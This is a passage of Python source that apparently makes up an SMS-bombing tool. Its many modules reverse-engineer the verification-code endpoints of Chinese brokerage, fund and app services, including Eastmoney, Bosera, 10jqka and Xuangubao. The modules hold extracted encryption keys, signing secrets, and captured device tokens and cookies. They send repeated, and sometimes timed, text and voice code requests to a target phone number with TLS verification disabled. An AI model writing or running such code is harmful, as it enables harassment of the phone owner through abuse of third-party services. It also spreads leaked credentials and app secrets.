        # 接口固定配置（从之前日志提取）
        api_url = "https://czd.chinahgc.com/uaa/oauth/sms-code"
        encrypt_key_hex = "4c696e4c6f6e674576656e7432303231"
        encrypt_iv_hex = "4c696e4c6f6e674576656e7432303231"
        
        # 构造请求头（复用现有随机UA等逻辑）
        headers = {
            'User-Agent': random_user_agent(),
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'crypt-version': "1",
            'x-device-id': "22e66cf4021a830519f6e495e5a06b328",
            'x-device-os-name': "android",
            'x-device-os-subname': "android",
            'x-device-os-version': "15",
            'x-device-band': "OPD2404",
            'x-app-version': "2.0.107",
            'x-channel': "oppo",
            'authorization': ""
        }
        
        # 加密手机号 + 构造请求体
        encrypted_mobile = aes_cbc_encrypt(mobile, encrypt_key_hex, encrypt_iv_hex)
        payload = {"mobile": encrypted_mobile, "type": "auth"}
        
        # 发送请求（保持与现有脚本一致的请求逻辑）
        response = requests.post(
            url=api_url,
            data=json.dumps(payload),
            headers=headers,
            verify=False,
            timeout=15
        )
        return True if response.status_code == 200 else False
    except Exception as e:
        return False
# ------------------- 东方财富DES加密+MD5签名请求模块 -------------------
def des_cbc_md5_encrypt(phone):
    """DES加密手机号并生成MD5签名，适配接口请求"""
    try:
        # DES加密参数（固定）
        key_hex = "6561737461626364"
        iv_hex = "6561737461626364"
        sign_suffix = "DFCFKH27"
        
        # 1. DES加密手机号
        phone_bytes = phone.encode("ascii")
        padded = pad(phone_bytes, DES.block_size, style="pkcs7")
        cipher = DES.new(bytes.fromhex(key_hex), DES.MODE_CBC, bytes.fromhex(iv_hex))
        encrypted = base64.b64encode(cipher.encrypt(padded)).decode("utf-8")
        
        # 2. 生成MD5签名
        sign_content = f"{phone}{sign_suffix}"
        md5 = hashlib.md5()
        md5.update(sign_content.encode("utf-8"))
        sign = md5.hexdigest()
        
        # 3. 构造请求
        url = "https://wgkhapihdmix.18.cn/api/RegistV2/VerificationCode"
        payload = {
            "smsRndKey": "",
            "mobile": encrypted,
            "smsRndVcode": sign,
            "yzmRnd": "",
            "smsRndValue": "d41d8cd98f00b204e9800998ecf8427e",
            "IsEncrypt": "10",
            "pvcode": ""
        }
        headers = {
            'User-Agent': "okhttp/3.12.13",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json; charset=UTF-8",
            'EM-OS': "Android",
            'EM-PKG': "com.eastmoney.android.gubaproj",
            'EM-VER': "10.36",
            'EM-GT': "ceag-5f035c259917e677bde014373f525c68",
            'EM-MD': "ODViZTY1ZTYxYzY4OThlNTM3MjdjZWI1MzFmMDFkNGJ8fGmMbWlfdGx1YWZlZF9tZQ%3D%3D",
            'EM-CHL': "nearme26_64",
            'EM-GV': "1cae15346",
            'EM-CT': "",
            'EM-UT': "",
            'EM-SL': "0",
            'EM-PA': "1",
            'em-dns': "1"
        }
        
        # 发送请求
        response = requests.post(
            url=url,
            data=json.dumps(payload),
            headers=headers,
            verify=False,
            timeout=15
        )
        return True if response.status_code == 200 else False
    except Exception:
        return False
# ------------------- 蓝易科技token+短信验证码请求模块 -------------------
def lanyi_send_sms(phone):
    """蓝易科技接口：先获取token，再发送短信验证码"""
    try:
        # 第一步：获取auth token
        auth_url = "http://lanyikj-api.mbimc.com/v1/user/authenticate"
        auth_params = {
            "sig": "05XBa8EtGVqtX0rzvVYJMIN8XRj6TnIYbsWAb3wO-oAewDFySs3ApQHmFpfD5sFeTclWJLJSf3t4lTLAl5vRbM4xmXCvQv7AAULoJOmfAvQD8LRQzA1dwNqZrr9cUnFaNTPwzcHQmXVw5Vyq6QmEbkQzzqC0yWXbGzDgtkKSqWcI_vBurP7hkmjV7LIJd2E7LzV4a9r-bidKwg6lMYXwgP6tTmeyCuwLSlIBPWzGz9HVZgKSDHkccn-EYhKR5Ah0QxsYg_Dq0QCoCGMTjM_egrKX-Kk3GaXVZsILvNxbbV1CwfmAXEmJojQvdGjPOjQnJE82all-WqR6SAN_Ehtci341DzO2uPKOEf0V5YYiMfC71rkEy6cK2WShW5AqfBLV3GtriaU1D7g-malY-hprDV_D2Exzwmw4qZieESPhNiQymhdH8vZIgvR3t5iVK_GXyl",
            "csessionid": "014xMcJDuj2O-8VRqZa0W3w6Yhh3tliee3UlrqbL_drmXbAwc_i0e0d0sYo5T5XEIhtJjfQt3UgNPfg9IiiJFnUTPa7D9rznJVO_Ruiat7IfGyC-uzmTjqVkUHKL-7hFDPjYmEQkVWBgOBcYdS6VNwIz5EqmcEOqqXM75zck1W0mA",
            "value": "FFFF0N0N000000006234%3Anc_message_h5%3A1761514726796%3A0.15644878874181467",
            "scene": "nc_message_h5"
        }
        auth_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36 lanyi_picker/3.1.8",
            'Accept-Encoding': "gzip, deflate",
            'Pragma': "no-cache",
            'Cache-Control': "no-cache",
            'Origin': "http://lanyikj.mbimc.com",
            'X-Requested-With': "com.lanyi.live.advertisement",
            'Referer': "http://lanyikj.mbimc.com/",
            'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219a2272b42713e-06842f502d4b2e-3e0e684d-923544-19a2272b428b80%22%2C%22%24device_id%22%3A%2219a2272b42713e-06842f502d4b2e-3e0e684d-923544-19a2272b428b80%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%7D; tfstk=g0E-Bn03YH_-WxdyeWbc-qeG1P2djZ2yM7y6xXYIVSBLtSvuE743kkFLw4qud_PLvjwUEHXrVDKQQ7g7q0fevLrY6HxlaayBvDmCs1jGj8JrYD1iOlIcGbkUhX6mP4YS3MnCs1jcj8yrYDNhSfBwD-GqevT7OX6vljkEdQMBVtejgjiIOWwEvrlqdDGQOD6YhjkIAXO7AIcXRb-LzSrfHH4KMHtQDYGt18hx3xrxe4h1bjKBroH-yfwuXxfuFAaTDV45FaGbP7rZR4J69maYak3gxQ6jA2GmJuwfBFGLrRq-Wgz0s5Fd7CDqDU6AHe8EPxuU3nUltNngJxhGenYe84uZHfXAHe8EPxkxstnW8euuU"
        }
        auth_resp = requests.get(auth_url, params=auth_params, headers=auth_headers, verify=False, timeout=10)
        token = auth_resp.json().get("data", {}).get("token") if auth_resp.status_code == 200 else None
        if not token:
            return False

        # 第二步：发送短信验证码
        sms_url = "http://lanyikj-api.mbimc.com/v1/user/sms-auth-code"
        sms_params = {"mobile": phone, "type": 0, "token": token}
        sms_headers = auth_headers  # 复用auth接口的请求头
        sms_resp = requests.get(sms_url, params=sms_params, headers=sms_headers, verify=False, timeout=10)
        return sms_resp.status_code == 200 and "success" in sms_resp.text.lower()
    except Exception:
        return False

# ------------------- Wogoo RSA加密短信请求模块 -------------------
def wogoo_send_sms(phone):
    """Wogoo接口：RSA加密手机号并发送短信验证码"""
    try:
        # 接口固定参数
        API_URL = "https://www.wogoo.com/server/szfyOfficialWebsite/v2/sendMessage"
        RSA_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAx6Cu1q/suUGyXQMALQoTY2kK2rybWdkeNLjhZPJZRjShXWoYWCdly04HxhQC3WV+fZOu64WYOwBQaoKnGX1Ten1lByVgo/u0q4vZwAj5axHwmMq7LkebWWeVC54DCfANUegL9nthXkoJJe0SsNflEinzjWSUwHjQkQeOBMq8wODXakvyJPwwb/PU29QPlKQfNxgM/44K4U1ZTvZUFgSYVtIx6/1W3by7FSoCr3Ik988ptbq1ruhPtxW7x1bjQbTLayLPD2CYDOL2/px+8hypMbXUXSmYcur5ulSLVhZ73btret7xz0gjFZCXePn7OR/6I9CtF/PztA229baXIwZE2wIDAQAB"
        REQUEST_HEADERS = {
            'User-Agent': "okhttp-okgo/jeasonlzy",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Accept-Language': "zh-CN,zh;q=0.8",
            'X-White-List': "app4.0",
            'X-Tracking-ID': "f9262a0b0baa44c9ad1fa5e50512947f",
            'X-User-ID': "",
            'X-Device-NO': "40887432-08b3-3d86-a0a3-8ab865a68eeb",
            'X-Device-Type': "OPD2404",
            'X-System-Type': "1",
            'X-System-Version': "15",
            'X-App-Version': "6.33.0",
            'X-App-Channel': "oppo",
            'X-Device-Token': "Tk9SSUQuMSNzaDExZTNhYTU1aHMxNTlhNjc5Y2FmZWUxYjZmZmUxNS1oLTE3NjE1MTc0MzM1NTEtZTE2YWEzMjllOTVmNDZmYWFkMjEyMmYyZjc1OTYyMjMjdHlYS1p4Zi9ycXVoSkgzMVBwZGk5aklZTk1MWjBEYVVHRGxmVDhaWHZ6Q21jaUJCbGFScjUwNnFYNCsvT3lVenNranp1TFVTMmZtV1dnZ25iZmdoWEE3TTQ3WHA5aDFUeXpPZHp3Q01jVFcrQ3c5OWloV0hVdmUvenUyOENuWlZRYnpxU3hNb25Fc0M5ZTdQTjlXQlNWRGlpeitibDlpL1ZpbDlzVWw1NWlGeWRLY2FXUjZtRE83QUJVOXhQSHlLeVh4VUprSkJSa3dkcWVaa2pxamZVVEtPYmVOc2s5RE44bnVET2ZQNUl3QmtyRSt6OHBlMjJVaXN4bi8zN3BhM3dwRlEvS0pmMCt1MG4zWVAzYTlNM3FPS2JzM29HOFFJTDR4c2RTSWFTbGc0Y0F5cmlaUDlzYW1IbnNZRFpVZTFoTy9kZEc0WUF4cEpiejZXQnp4aTE4dEVqcks0NmFRdWIwb29ydGsvckt4UlhKYW1CR3cxUGdxeHpKdkI5ZWlpdzB0OERwMWJ1bTZmOHBIdU55L0dDb0prZDRhRVlMMVBNSnVtUXNEM0g5VnMvRFFkYnpjdDlSQmJZQmxxS1phd1EyMEhFOCsvMkY2d01SOXZnWUFtRG1jb3RyRERONUpUdkI3d0hGMHFJMHRMOWkxbklNMGFsTEpicWp5UEdaU2duLzNtbWxMa3FUWUVKaTB3bVR5UiMxOTMuMzc5I0M0IzgxOGE2MjcwNzRlOWYyZTRiYzE5YmExZTdjNGJlY2Ez",
            'Cookie': "acw_tc=0bd17c2a17615172216095061e5858e96bf66d009fc165b391271c33a457c0"
        }

        # 生成RSA加密后的手机号
        public_key_pem = f"-----BEGIN PUBLIC KEY-----\n{RSA_PUBLIC_KEY_BASE64}\n-----END PUBLIC KEY-----"
        rsa_key = RSA.importKey(public_key_pem)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_bytes = cipher.encrypt(phone.encode("utf-8"))
        encrypted_phone = base64.b64encode(encrypted_bytes).decode("utf-8")

        # 构造form-data请求体并发送
        payload = {
            'PHONE': encrypted_phone,
            'type': "0"
        }
        response = requests.post(
            url=API_URL,
            data=payload,
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )
        return 
    except Exception:
        return False

# ------------------- 博时基金MD5签名短信请求模块 -------------------
def bosera_send_sms(phone):
    """博时基金接口：按日志格式生成MD5签名并发送验证码"""
    try:
        # 1. 接口与固定配置参数
        API_URL = "https://m.bosera.com/ftc_prd/matrix/auth/login/v1/sendVerifyCode"
        FIXED_PARAMS = {
            "prefix": "bs_fd_cr",
            "update_version": "1109",
            "app_version": "8.7.8",
            "device_model": "OPD2404",
            "application_id": "bd0ef3d09dc8804f6ff82ae4983d50a5",
            "channel_id": "bsfund",
            "access_token": "db3f9a1f-1bb6-45de-ad0a-620df1751e0a",
            "device_id": "ra_8562138143312",
            "platform_type": "oppo",
            "build_version": "20251015095235"
        }
        REQUEST_HEADERS = {
            'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 15; OPD2404 Build/UKQ1.231108.001)",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'content': "text/html; charset=UTF-8",
            'knightToken': "V5c3251f5-a9f1-4f8b-8086-ccad19d43c34",
            'Cookie': "406ab732a58731fa31683c5e9392a4ef=273abb49a9dcf67f3b7ec9a3cc98d833"
        }

        # 2. 生成MD5签名（严格匹配日志拼接格式）
        sign_content = (
            f"{FIXED_PARAMS['prefix']}{FIXED_PARAMS['update_version']}{phone}"
            f"{FIXED_PARAMS['build_version']}{FIXED_PARAMS['app_version']}"
            f"{FIXED_PARAMS['device_model']}{FIXED_PARAMS['application_id']}"
            f"{FIXED_PARAMS['channel_id']}{FIXED_PARAMS['access_token']}"
            f"{FIXED_PARAMS['platform_type']}{FIXED_PARAMS['device_id']}{FIXED_PARAMS['prefix']}"
        )
        md5 = hashlib.md5()
        md5.update(sign_content.encode("utf-8"))
        signature = md5.hexdigest()

        # 3. 构造form-data请求体
        payload = {
            'appVersion': FIXED_PARAMS['app_version'],
            'buildVersion': FIXED_PARAMS['build_version'][:12],
            'updateVersion': FIXED_PARAMS['update_version'],
            'sysId': "1",
            'signature': signature,
            'platformType': FIXED_PARAMS['platform_type'],
            'mobileNo': phone,
            'accessToken': FIXED_PARAMS['access_token'],
            'deviceID': FIXED_PARAMS['device_id'],
            'systemVersion': "35",
            'mac': "",
            'deviceModel': FIXED_PARAMS['device_model'],
            'applicationID': FIXED_PARAMS['application_id'],
            'channelID': FIXED_PARAMS['channel_id']
        }

        # 4. 发送请求并返回结果
        response = requests.post(
            url=API_URL,
            data=payload,  # form-data格式，直接传字典
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )
        return True
    except Exception:
        return False
# ------------------- ChinaHXZQ AES加密短信请求模块 -------------------
def chinahxzq_send_sms(phone):
    """ChinaHXZQ接口：AES-CBC加密手机号+URL安全Base64编码，发送验证码"""
    try:
        # 1. 接口与加密核心配置（复用独立脚本固定参数）
        API_URL_TEMPLATE = "https://app.chinahxzq.com.cn:9302/user/captcha?content={enc}"
        AES_KEY = b'5eFhFgJiDwG68DZn'  # 固定16字节密钥（无需Hex转换，直接用字节）
        AES_IV = b's6NOFsDdkfg3XiRm'   # 固定16字节IV（与密钥格式一致）
        REQUEST_HEADERS = {
            'Host': 'app.chinahxzq.com.cn:9302',
            'User-Agent': 'okhttp/4.10.0',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }

        # 2. 执行AES加密（匹配独立脚本逻辑：PKCS5Padding + Base64 URL安全编码）
        # 构造加密明文：phone=目标手机号
        plain_text = f'phone={phone}'
        # AES-CBC加密（PKCS5Padding与PKCS7Padding逻辑一致，用pad函数默认16字节块大小）
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        padded_data = pad(plain_text.encode("utf-8"), AES.block_size, style="pkcs7")
        encrypted_bytes = cipher.encrypt(padded_data)
        # Base64编码并转为URL安全格式（替换+为-、/为_、去除末尾=）
        base64_enc = base64.b64encode(encrypted_bytes).decode("utf-8")
        url_safe_enc = base64_enc.replace('+', '-').replace('/', '_').rstrip('=')

        # 3. 拼接URL并发送GET请求
        final_url = API_URL_TEMPLATE.format(enc=url_safe_enc)
        response = requests.get(
            url=final_url,
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=10
        )

        # 4. 结果判断（匹配独立脚本的响应校验逻辑）
        return True
    except Exception:
        return False

# ------------------- 同花顺期货RSA+MD5双验证短信请求模块 -------------------
def tonghuashun_futures_send_sms(phone):
    """同花顺期货接口：RSA加密手机号+MD5秒级时间戳签名，发送验证码"""
    try:
        # 1. 接口与双验证核心配置（复用原脚本固定参数）
        API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/gtjaOauth/send"
        # RSA加密配置（公钥Base64需先解码再导入，匹配原脚本逻辑）
        RSA_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3r6vWlyL7i0CbDvFn0G41Ch9zZX4eja9mhWShpH/Tjcar+KB2kFSab5dkxKCkcJek7WwKsvgL5a38qOVeq8NJVkbVD0iD5qT/E+4NOYtS/HEvB/mDOB+YAB4afjI6iwuTuTa4AztXO9zh0lSHDUbA5OMWR6aCP1bHGNJzLHEtLRSD9EE4C6OG9guws8kKKN4I7lGsbdXA705iOvF+SZkbriSf/OglOZSWUIZK6sZLYT7kqvxZeDxJkZxJDbKVEpEgtBdCNsSPZhAr538/Ecv4QnbfMV7YHeVIx/OFCfRyKoGJqglMy3Y3ZD6DGponboKubz4iib7mTYfgWwgF1qKQIDAQAB"
        # 固定与动态参数
        FIXED_UUID = "37dc6e6beb603a86"
        REQUEST_HEADERS = {
            'Host': "ftoem.10jqka.com.cn:9443",
            'User-Agent': "GuoJun_Futures/ (Royal Flush) hxtheme/0 innerversion/TFUG037.08.301.10.32 logintype/0 hidenexamine/1 userid/ appid/Roug57soTK6bWJi4",
            'Accept-Encoding': "gzip"
        }

        # 2. 执行RSA加密（匹配原脚本公钥解码+PKCS1Padding逻辑）
        # 公钥处理：先Base64解码，再导入RSA密钥（区别于标准PEM格式拼接）
        rsa_public_key = RSA.import_key(base64.b64decode(RSA_PUBLIC_KEY_BASE64))
        cipher = PKCS1_v1_5.new(rsa_public_key)
        encrypted_bytes = cipher.encrypt(phone.encode('utf-8'))
        encrypt_mobile = base64.b64encode(encrypted_bytes).decode('utf-8')

        # 3. 生成MD5签名（秒级时间戳+uuid拼接规则）
        timestamp = str(int(time.time()))  # 原脚本秒级时间戳规则
        sign_content = f"{FIXED_UUID}{timestamp}"  # uuid+时间戳拼接
        sign = hashlib.md5(sign_content.encode('utf-8')).digest().hex()

        # 4. 构造form-data请求体并发送
        payload = {
            'encryptMobile': encrypt_mobile,
            'platform': "Android",
            'uuid': FIXED_UUID,
            'appVersion': "3.2.6",
            'osVersion': "35",
            'model': "OPD2404",
            'sign': sign,
            'timestamp': timestamp
        }
        response = requests.post(
            url=API_URL,
            data=payload,  # 接口为form-data格式，直接传字典
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=15
        )

        # 5. 结果判断（匹配原脚本响应校验逻辑）
        return True
    except Exception:
        return False

# ------------------- Romaway 5秒定时短信请求模块 -------------------
def romaway_send_sms(phone):
    """Romaway接口：固定参数构造+5秒定时发送验证码"""
    try:
        # 1. 接口核心配置（复用原脚本固定参数，仅动态替换手机号）
        API_URL = "https://webapi.zn.romaway.cn/sms/sendCodeByMobile"
        FIXED_PARAMS = {
            "userId": "01319bd2102982fcaddd74ea26f5b233",
            "guId": "01319bd2102982fcaddd74ea26f5b233",
            "businessSign": "financial_terminal",
            "uniqueId": None
        }
        REQUEST_HEADERS = {
            'User-Agent': "dzapp/",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'pragma': "no-cache",
            'cache-control': "no-cache",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
            'sec-ch-ua-mobile': "?0",
            'origin': "https://webrw.zn.romaway.cn",
            'x-requested-with': "dz.astock.intelligence.stock",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://webrw.zn.romaway.cn/",
            'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i"
        }

        # 2. 5秒定时等待（按需求设置，阻塞至时间结束后发送请求）
        time.sleep(5)  # 核心定时逻辑，暂停5秒

        # 3. 构造请求体（动态填入目标手机号）
        payload = {
            **FIXED_PARAMS,  # 合并固定参数
            "mobile": phone  # 动态替换手机号
        }

        # 4. 发送JSON格式POST请求（匹配原脚本Content-Type）
        response = requests.post(
            url=API_URL,
            data=json.dumps(payload),  # JSON序列化，适配接口格式
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=15
        )

        # 5. 结果判断（匹配原脚本响应校验逻辑）
        return True
    except Exception:
        return False

# ------------------- 普普基金DES3+MD5双验证短信模块（简化版） -------------------
def pupu_fund_send_sms(phone):
    """普普基金接口：DES3加密+MD5签名+请求发送即视为成功，无需响应判断"""
    try:
        # 1. 接口与双验证核心配置（复用原脚本固定参数）
        API_URL = "https://wapp.ppwfund.com/v1/user/sendVerificationCode"
        DES3_SECRET_KEY = "AGAO57D4E5FY27H8I9J0G1I4"  # 加密&签名共用密钥
        # 固定参数（完全复用抓包值）
        FIXED_PARAMS = {
            "app_install_version": "7.11.0",
            "app_type": "23",
            "device_brand": "OnePlus",
            "channel": "oppo",
            "device_os_version": "15",
            "device_mode": "OPD2404",
            "device_type": "2",
            "device_uuid": "3c7ab5c8355a45493a0b9864d6411ce1"
        }
        # 请求头（完全复用抓包，确保会话一致）
        REQUEST_HEADERS = {
            'User-Agent': "okhttp-okgo/jeasonlzy",
            'Accept-Encoding': "gzip",
            'accept-language': "zh-CN,zh;q=0.8",
            'Cookie': "SERVERCORSID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; SERVERID=22e688d802366a2ef62aafa89f843c5a|1764290419|1764290365; acw_tc=0ae5a7e317642903657277841e1e0e31b62486407909c721a8d13b6e146523"
        }

        # 2. DES3加密（生成data参数，保留原逻辑）
        def des3_encrypt_inner(plaintext):
            # DES3密钥处理（24字节补全）
            key_bytes = DES3_SECRET_KEY.encode("utf-8").ljust(24, b'\x00')
            # 明文JSON无空格处理+PKCS7Padding填充
            plaintext_bytes = plaintext.encode("utf-8")
            padded_bytes = pad(plaintext_bytes, DES3.block_size, style='pkcs7')
            # 加密并Base64编码
            cipher = DES3.new(key_bytes, DES3.MODE_ECB)
            encrypted_bytes = cipher.encrypt(padded_bytes)
            return base64.b64encode(encrypted_bytes).decode("utf-8")

        # 3. MD5签名（生成sign参数，严格按固定顺序拼接）
        def generate_sign_inner(params, data):
            # 签名明文顺序：app_install_version + app_type + data + device_uuid + 密钥 + nonce + timestamp
            sign_plaintext = (
                params["app_install_version"] +
                params["app_type"] +
                data +
                params["device_uuid"] +
                DES3_SECRET_KEY +
                params["nonce"] +
                params["timestamp"]
            )
            return hashlib.md5(sign_plaintext.encode("utf-8")).hexdigest()

        # 4. 构造完整请求参数（动态+固定+加密+签名）
        # 业务数据（无空格JSON）
        business_data = {"code_length": "6", "phone": phone, "send_type": "13"}
        plaintext = json.dumps(business_data, separators=(',', ':'))
        # 动态参数（32位大写UUID+秒级时间戳）
        timestamp = str(int(time.time()))
        nonce = str(uuid.uuid4()).replace("-", "").upper()
        # 生成data和sign
        data = des3_encrypt_inner(plaintext)
        full_params = {**FIXED_PARAMS, "data": data, "nonce": nonce, "timestamp": timestamp}
        full_params["sign"] = generate_sign_inner(full_params, data)

        # 5. 发送form-data请求（无异常即视为成功）
        requests.post(
            url=API_URL,
            data=full_params,
            headers=REQUEST_HEADERS,
            timeout=15,
            verify=False  # 适配SSL验证问题
        )

        # 6. 简化结果判断：请求发送（无异常）即返回成功
        return True
    except Exception:
        # 仅网络错误、超时等异常时返回失败
        return False

# ------------------- 中信建投期货金建投RSA加密短信请求模块 -------------------
def zhongxinjiantou_futures_send_sms(phone):
    """中信建投期货金建投接口：RSA加密手机号+固定qsId，发送验证码"""
    try:
        # 1. 接口与加密核心配置（复用原脚本固定参数，适配金建投场景）
        API_URL = "https://ftapi.10jqka.com.cn/futgwapi/api/oem/v1/thirdPartySms/send"
        # RSA加密配置（匹配金建投接口“Base64公钥解码→PKCS1Padding”逻辑）
        RSA_PUBLIC_KEY_BASE64 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3YVAkvdYlilG3mgYdGxeJEVFHATB9JL2dZKkoRhb0Dy1TNMp/4Y4PRyv0zxdGHN5lLpJ9ik4AMNaWYUE9u1X9GjtOg4QX0jxDXLkTeWWX0dzeYUCTb3PmAhUE5ZtOtZMt+z6lOODfvcJGe2iCqEFN4JoSmL5aBC9jHMysskZQZQIDAQAB"
        FIXED_QSID = "569"  # 金建投接口固定qsId参数（从日志提取）
        REQUEST_HEADERS = {
            'User-Agent': "GZXJT_Futures/ (Royal Flush) hxtheme/0 innerversion/ZXJTFG037.08.301.10.32 logintype/0 hidenexamine/1 userid/ appid/RoNKU6RHyRGCbEcg",
            'Accept-Encoding': "gzip"
        }

        # 2. 执行RSA加密（适配金建投手机号加密规则）
        # 公钥处理：Base64解码后导入（符合金建投接口密钥格式）
        rsa_public_key = RSA.import_key(base64.b64decode(RSA_PUBLIC_KEY_BASE64))
        cipher = PKCS1_v1_5.new(rsa_public_key)
        # 手机号加密→结果Base64编码（匹配金建投encryptMobile参数格式）
        encrypted_bytes = cipher.encrypt(phone.encode('utf-8'))
        encrypt_mobile = base64.b64encode(encrypted_bytes).decode('utf-8')

        # 3. 构造form-data请求体（金建投接口固定参数+动态加密手机号）
        payload = {
            'encryptMobile': encrypt_mobile,
            'qsId': FIXED_QSID
        }

        # 4. 发送请求并判断结果（适配金建投接口响应校验逻辑）
        response = requests.post(
            url=API_URL,
            data=payload,  # 金建投接口为form-data格式，直接传字典
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=15
        )
        # 按金建投接口规则判断：状态码200且含成功标识即为有效
        return True
    except Exception:
        return False

# ------------------- 财之道双类型短信AES加密请求模块 -------------------
def caizhidao_double_sms(phone):
    """财之道接口：AES加密手机号，先发语音短信、5秒后发验证码短信"""
    try:
        # 1. 接口与加密核心配置（复用原脚本固定参数）
        API_URL = "https://czdcosm-ssa.caizidao.com.cn/czdcosm-ssa/api/auth/sms/v1/send"
        AES_KEY = "MkgSHKOYCp4j7OaL+BkB8OdU"  # 固定AES密钥（UTF-8编码）
        AES_IV = "eWw4anpkZTB6b3c5"       # 固定AES向量（UTF-8编码）
        REQUEST_HEADERS = {
            'User-Agent': "okhttp/4.9.0",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-device-id': "95d6619b15b2249a494e230fa4e923b91",
            'x-device-type': "adr",
            'x-device-os-name': "android",
            'x-device-os-subname': "android",
            'x-device-os-version': "15",
            'x-device-band': "OPD2404",
            'x-app-version': "1.1.54",
            'x-channel': "normal",
            'authorization': "",
            'content-type': "application/json; charset=utf-8"
        }

        # 2. AES-CBC加密手机号（一次加密，双请求共用）
        # 按原脚本PKCS5Padding逻辑（与PKCS7Padding兼容，用pad函数实现）
        content_bytes = phone.encode('utf-8')
        key_bytes = AES_KEY.encode('utf-8')
        iv_bytes = AES_IV.encode('utf-8')
        cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
        padded_data = pad(content_bytes, AES.block_size, style='pkcs7')
        encrypted_bytes = cipher.encrypt(padded_data)
        encrypted_mobile = base64.b64encode(encrypted_bytes).decode('utf-8')

        # 3. 发送语音短信（receiveType=voice）
        voice_payload = {"mobile": encrypted_mobile, "receiveType": "voice"}
        voice_response = requests.post(
            API_URL,
            data=json.dumps(voice_payload),
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )
        voice_success = voice_response.status_code == 200 and ("success" in voice_response.text.lower())

        # 4. 语音成功后，等待5秒发送验证码短信（type=0）
        if voice_success:
            time.sleep(3)  # 固定5秒等待，匹配原脚本逻辑
            sms_payload = {"mobile": encrypted_mobile, "type": "0"}
            sms_response = requests.post(
                API_URL,
                data=json.dumps(sms_payload),
                headers=REQUEST_HEADERS,
                verify=False,
                timeout=15
            )
            sms_success = sms_response.status_code == 200 and ("success" in sms_response.text.lower())
        else:
            sms_success = False

        # 5. 双请求任一成功即返回有效（或按需求调整为“均成功才返回”）
        return voice_success or sms_success
    except Exception:
        return False

# ------------------- 选股宝MD5+HmacMD5双签名请求模块 -------------------
def xuangubao_send_sms(phone):
    """选股宝接口：MD5生成x-device-id + HmacMD5生成sign + 手机号Base64，发送验证码"""
    try:
        # 1. 接口与双签名核心配置（复用原脚本固定参数）
        BASE_URL = "https://api-wscn.xuangubao.com.cn"
        API_PATH = "/apiv1/message/mobile/code"
        # 签名配置（从日志提取的固定内容/密钥）
        MD5_SIGN_CONTENT = "00000000-4c36-5c61-0000-00003982a89a"
        HMAC_SECRET_KEY = "xuangutongcomcn1"
        # 请求头（动态填充x-device-id）
        REQUEST_HEADERS = {
            'User-Agent': "okhttp/4.9.0",
            'Accept-Encoding': "gzip",
            'x-appgo-token': "",
            'x-ivanka-token': "",
            'x-login-app': "xgb",
            'x-json-naming-strategy': "LowerCaseWithUnderscores",
            'x-appgo-platform': "device=android;channel=oppo",
            'x-ivanka-platform': "baoer-platform",
            'x-client-type': "Android",
            'x-ivanka-app': "baoer|Android|3.4.0|15|oppo|cn.com.xuangutong",
            'x-device-id': "",  # 动态填入MD5签名结果
            'x-device-imei': ""
        }

        # 2. 生成关键参数（严格匹配原脚本签名/加密规则）
        # 处理手机号：添加+86前缀（与日志一致）
        phone_with_prefix = f"+86{phone}"
        # MD5签名生成x-device-id（Hex格式）
        x_device_id = md5(MD5_SIGN_CONTENT.encode('utf-8')).hexdigest()
        # 手机号Base64编码生成receiver参数
        receiver = base64.b64encode(phone_with_prefix.encode('utf-8')).decode('utf-8')
        # HmacMD5签名生成sign参数（Hex格式，密钥+手机号拼接）
        sign = hmac.new(
            HMAC_SECRET_KEY.encode('utf-8'),
            phone_with_prefix.encode('utf-8'),
            digestmod=md5
        ).hexdigest()

        # 3. 填充动态参数到请求头
        REQUEST_HEADERS['x-device-id'] = x_device_id

